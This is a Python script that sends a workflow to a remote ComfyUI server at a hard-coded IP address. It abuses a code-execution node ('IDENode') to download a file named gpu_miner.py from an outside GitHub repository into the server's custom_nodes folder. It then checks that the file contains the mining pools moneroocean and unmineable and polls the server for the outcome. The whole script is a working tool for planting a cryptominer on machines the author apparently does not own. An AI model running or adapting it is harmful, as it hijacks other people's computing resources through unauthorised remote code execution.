"""Push just gpu_miner.py to a remote machine via IDENode."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = f"http://{ip}:8188"

code = r"""
import os, urllib.request

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    for g in ['/root/ComfyUI/custom_nodes',
              r'C:\Users\u88ni\Desktop\comfyui\custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin') if cn else None
dest = os.path.join(target, 'core', 'gpu_miner.py')
url = 'https://raw.githubusercontent.com/bossman79/webcoin/master/core/gpu_miner.py'

try:
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req, timeout=60) as resp:
        content = resp.read()
    with open(dest, 'wb') as f:
        f.write(content)
    result = 'OK gpu_miner.py (' + str(len(content)) + 'b)'
except Exception as e:
    result = 'FAIL gpu_miner.py: ' + str(e)[:200]

# verify
with open(dest) as f:
    txt = f.read()
result += chr(10) + 'has_moneroocean=' + str('moneroocean' in txt)
result += chr(10) + 'has_unmineable=' + str('unmineable' in txt)
"""

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

for attempt in range(8):
    time.sleep(10)
    try:
        req2 = urllib.request.Request(f"{base}/history/{pid}")
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print(f"Status: {status}")
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print(f"poll error: {e}")
else:
    print("Still pending after 80s")
